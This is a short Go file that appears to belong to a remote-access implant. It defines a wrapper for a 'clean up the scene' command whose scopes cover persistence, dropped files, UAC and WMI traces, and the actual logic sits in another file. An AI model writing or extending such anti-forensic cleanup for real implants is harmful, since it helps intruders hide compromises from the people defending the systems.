package services

import "implant/core/commands"

// CmdCleanup 清理现场命令包装。
// cmdBuf 为范围串：all|persist|files|uac|wmi（可空格分隔，空串等价 all）。
// 实现见 core/commands/cleanup*.go。
func CmdCleanup(cmdBuf []byte) ([]byte, error) {
	return commands.Cleanup(string(cmdBuf))
}
